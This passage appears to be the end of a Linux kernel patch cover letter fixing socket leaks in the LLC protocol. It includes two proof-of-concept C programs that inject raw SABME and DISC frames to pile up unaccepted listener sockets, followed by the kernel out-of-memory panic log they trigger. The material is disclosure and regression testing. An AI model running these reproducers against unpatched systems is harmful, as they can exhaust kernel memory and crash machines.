			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");
	}
	usleep(200000);
	after_send = llc_socket_count();
	/* TCP-style: sk_acceptq_is_full() is >, so listen(N) can hold N+1. */
	expected_max = 1 + backlog + 1;
	printf("listen_backlog=%d sabme_sent=%d llc_sockets_open=%d expected_max=%d\n",
	       backlog, nframes, after_send, expected_max);
	if (after_send < 1 || after_send > expected_max) {
		fprintf(stderr, "FAIL: open socket count %d not in 1..%d\n",
			after_send, expected_max);
		return EXIT_FAILURE;
	}
	close(packet_fd);
	close(listener_fd);
	usleep(200000);
	after_close = llc_socket_count();
	printf("llc_sockets_after_close=%d\n", after_close);
	if (after_close != 0) {
		fprintf(stderr, "FAIL: leftover sockets after close: %d\n",
			after_close);
		return EXIT_FAILURE;
	}
	printf("backlog_rc=0\n");
	return 0;
}
------END poc-backlog.c--------

------BEGIN poc-queued-disc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define SABME_CMD 0x6f
#define DISC_CMD 0x43

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");
	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd = socket(AF_LLC, SOCK_STREAM, 0);

	if (fd < 0)
		die_errno("socket(AF_LLC)");
	get_if_hwaddr(ifname, mac);
	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = DEFAULT_SAP;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 1) < 0)
		die_errno("listen(AF_LLC)");
	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int one = 1;
	int ifindex = get_ifindex(ifname);
	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	if (fd < 0)
		die_errno("socket(AF_PACKET)");
	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;
	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");
	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], unsigned char id)
{
	mac[0] = 0x02;
	mac[1] = 0xaa;
	mac[2] = 0xbb;
	mac[3] = 0xcc;
	mac[4] = 0xdd;
	mac[5] = id;
}

static void send_frame(int packet_fd, int ifindex,
			       const unsigned char dst[ETH_ALEN],
			       const unsigned char src[ETH_ALEN],
			       unsigned char ctrl_1, unsigned char ctrl_2)
{
	unsigned char frame[ETH_ZLEN];
	struct sockaddr_ll sll;

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst, ETH_ALEN);
	memcpy(frame + ETH_ALEN, src, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = ctrl_1;
	frame[ETH_HLEN + 3] = ctrl_2;
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst, ETH_ALEN);
	if (sendto(packet_fd, frame, sizeof(frame), 0,
		   (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("sendto(AF_PACKET)");
}

static int llc_socket_count(void)
{
	FILE *fp = fopen("/proc/net/llc/socket", "r");
	char line[256];
	int count = 0;

	if (!fp)
		return -1;
	if (!fgets(line, sizeof(line), fp)) {
		fclose(fp);
		return -1;
	}
	while (fgets(line, sizeof(line), fp))
		count++;
	fclose(fp);
	return count;
}

int main(int argc, char **argv)
{
	const char *rx_if = argc > 1 ? argv[1] : DEFAULT_RX_IF;
	const char *tx_if = argc > 2 ? argv[2] : DEFAULT_TX_IF;
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	unsigned char next_src_mac[ETH_ALEN];
	struct sockaddr_llc addr;
	struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
	int listener_fd, packet_fd, ifindex, child;
	int accept_errno, open_count, after_close;
	socklen_t addrlen = sizeof(addr);

	listener_fd = make_listener(rx_if, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);
	fill_src_mac(src_mac, 0xee);

	/* Queue an indication, then tear down the unaccepted child remotely. */
	send_frame(packet_fd, ifindex, dst_mac, src_mac, SABME_CMD, 0);
	usleep(100000);
	send_frame(packet_fd, ifindex, dst_mac, src_mac, DISC_CMD, 0);
	usleep(100000);
	/* This used to drive the queued child from ADM to OUT_OF_SVC. */
	send_frame(packet_fd, ifindex, dst_mac, src_mac, 0x00, 0x00);
	usleep(200000);

	/* A different source must be able to create the next child. */
	fill_src_mac(next_src_mac, 0xef);
	send_frame(packet_fd, ifindex, dst_mac, next_src_mac, SABME_CMD, 0);
	usleep(200000);

	open_count = llc_socket_count();
	setsockopt(listener_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	child = accept(listener_fd, (struct sockaddr *)&addr, &addrlen);
	accept_errno = child < 0 ? errno : 0;
	if (child >= 0)
		close(child);

	close(packet_fd);
	close(listener_fd);
	usleep(200000);
	after_close = llc_socket_count();
	printf("queued_disc_open=%d accept_errno=%d queued_disc_after_close=%d\n",
	       open_count, accept_errno, after_close);
	if (open_count != 2 || child < 0 || after_close != 0)
		return EXIT_FAILURE;
	return 0;
}
------END poc-queued-disc.c--------

----BEGIN crash log----
Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled

[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3

[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014

[ 1665.706676][T10284] Call Trace:

[ 1665.706943][T10284]  <TASK>

[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:118 (discriminator 3)) 

[1665.707568][T10284] panic (kernel/panic.c:611) 

[1665.707918][T10284] ? dump_header (arch/x86/include/asm/atomic64_64.h:15 include/linux/atomic/atomic-arch-fallback.h:2583 include/linux/atomic/atomic-long.h:38 include/linux/atomic/atomic-instrumented.h:3189 include/linux/vmstat.h:196 include/linux/vmstat.h:208 mm/oom_kill.c:183 mm/oom_kill.c:473) 

[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:288) 

[1665.708678][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182) 

[1665.709132][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182) 

[1665.709616][T10284] ? out_of_memory (mm/oom_kill.c:1158 (discriminator 1)) 

[1665.710024][T10284] out_of_memory (mm/oom_kill.c:1158 (discriminator 1)) 

[1665.710435][T10284] ? __pfx_out_of_memory (mm/oom_kill.c:1114) 

[1665.710868][T10284] ? lock_acquire+0x2f/0xb0 

[1665.711243][T10284] ? __alloc_pages_noprof (mm/page_alloc.c:4188 mm/page_alloc.c:4478 mm/page_alloc.c:4839) 

[1665.711712][T10284] __alloc_pages_noprof (include/linux/vmstat.h:236 (discriminator 1) mm/page_alloc.c:4201 (discriminator 1) mm/page_alloc.c:4478 (discriminator 1) mm/page_alloc.c:4839 (discriminator 1)) 

[1665.712184][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182) 

[1665.712658][T10284] ? hlock_class+0x4e/0x130 

[1665.713041][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182) 

[1665.713501][T10284] ? __pfx___alloc_pages_noprof (mm/page_alloc.c:4792) 

[1665.713991][T10284] ? __pfx___lock_acquire+0x10/0x10 

[1665.714431][T10284] ? __sanitizer_cov_trace_switch+0x54/0x90 

[1665.714917][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182) 

[1665.715381][T10284] ? policy_nodemask (mm/mempolicy.c:1865 (discriminator 1) mm/mempolicy.c:2066 (discriminator 1)) 

[1665.715788][T10284] alloc_pages_mpol_noprof (include/linux/mm.h:1637) 

[1665.716246][T10284] ? __pfx_alloc_pages_mpol_noprof (mm/mempolicy.c:2227) 

[1665.716734][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182) 

[1665.717194][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182) 

[1665.717656][T10284] ? xas_load (lib/xarray.c:243) 

[1665.718005][T10284] ? filemap_get_entry (mm/filemap.c:1850) 

[1665.718439][T10284] folio_alloc_noprof (include/linux/instrumented.h:68 include/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-flags.h:829 include/linux/page-flags.h:850 mm/internal.h:703 mm/internal.h:699 mm/mempolicy.c:2356) 

[1665.718847][T10284] filemap_alloc_folio_noprof (mm/filemap.c:1511) 

[1665.719316][T10284] ? __pfx_filemap_alloc_folio_noprof (mm/filemap.c:996) 

[1665.719803][T10284] ? filemap_fault (include/linux/instrumented.h:68 include/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-flags.h:562 mm/filemap.c:3241 mm/filemap.c:3342) 

[1665.720231][T10284] __filemap_get_folio (mm/filemap.c:3818) 

[1665.720683][T10284] filemap_fault (mm/internal.h:1002 mm/filemap.c:3242 mm/filemap.c:3342) 

[1665.721097][T10284] ? __pfx_filemap_fault (mm/filemap.c:3315) 

[1665.721534][T10284] ? do_pte_missing+0x165a/0x3ff0 

[1665.721944][T10284] ? __pfx_lock_release+0x10/0x10 

[1665.722375][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645) 

[1665.722813][T10284] __do_fault (mm/memory.c:4887) 

[1665.723172][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645) 

[1665.723621][T10284] do_pte_missing+0x174c/0x3ff0 

[1665.724026][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182) 

[1665.724482][T10284] ? reacquire_held_locks+0x20b/0x4c0 

[1665.724932][T10284] ? lock_vma_under_rcu (include/linux/mm.h:718 (discriminator 2) mm/memory.c:6266 (discriminator 2)) 

[1665.725374][T10284] __handle_mm_fault (mm/memory.c:4791 mm/memory.c:3963 mm/memory.c:5789 mm/memory.c:5932) 

[1665.725805][T10284] ? __pfx_lock_release+0x10/0x10 

[1665.726207][T10284] ? down_read_trylock (kernel/locking/rwsem.c:1604) 

[1665.726640][T10284] ? __pfx___handle_mm_fault (mm/memory.c:5841) 

[1665.727085][T10284] ? __pfx_down_read_trylock (kernel/locking/rwsem.c:1562) 

[1665.727574][T10284] ? __pfx_lock_vma_under_rcu (mm/memory.c:6256) 

[1665.728053][T10284] handle_mm_fault (mm/memory.c:2943) 

[1665.728479][T10284] do_user_addr_fault (arch/x86/mm/fault.c:441 arch/x86/mm/fault.c:1230) 

[1665.728921][T10284] exc_page_fault (arch/x86/include/asm/irqflags.h:37 arch/x86/include/asm/irqflags.h:114 arch/x86/mm/fault.c:1485 arch/x86/mm/fault.c:1534) 

[1665.729305][T10284] asm_exc_page_fault (arch/x86/include/asm/idtentry.h:623) 

[ 1665.729700][T10284] RIP: 0033:0x559e433ce5cb

[ 1665.730065][T10284] Code: Unable to access opcode bytes at 0x559e433ce5a1.

Code starting with the faulting instruction
===========================================

[ 1665.730594][T10284] RSP: 002b:00007ffcc17c93f0 EFLAGS: 00010206

[ 1665.731148][T10284] RAX: 000000000000003c RBX: 00007ffcc17c9418 RCX: 0000559e433d10c6

[ 1665.731733][T10284] RDX: 000000000000002c RSI: 0000559e433d10c0 RDI: 0000000000000004

[ 1665.732318][T10284] RBP: 00007ffcc17c9412 R08: 00007ffcc17c9420 R09: 0000000000000014

[ 1665.732904][T10284] R10: 0000000000000000 R11: 0000000000000202 R12: 0000559e433d10c6

[ 1665.733491][T10284] R13: d288ce703afb7e91 R14: 0000000000019194 R15: 0000000000000004

[ 1665.734120][T10284]  </TASK>

[ 1665.735174][T10284] Kernel Offset: disabled

[ 1665.735576][T10284] Rebooting in 86400 seconds..
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (2):
  llc: release unaccepted listener child sockets
  llc: create listener children only for SABME

 include/net/llc_conn.h |  12 +
 net/llc/af_llc.c       |  35 ++-
 net/llc/llc_conn.c     | 502 ++++++++++++++++++++++++++++++++++++++---
 3 files changed, 513 insertions(+), 36 deletions(-)

-- 
2.43.0
